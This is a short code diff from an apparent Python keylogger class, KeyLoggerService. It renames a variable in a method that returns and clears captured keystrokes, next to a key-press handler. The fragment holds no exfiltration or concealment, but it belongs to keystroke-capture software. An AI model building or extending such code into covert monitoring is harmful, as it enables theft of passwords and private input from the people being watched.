@@ -21,9 +21,9 @@ class KeyLoggerService:
         self.listener.stop()
 
     def get_keys(self):
-        temp = self.keys
+        temp_str = self.keys
         self.keys = str()
-        return temp
+        return temp_str
 
     def _on_press(self , key):
         updated_key = KeyLoggerService._correction_keys(key)
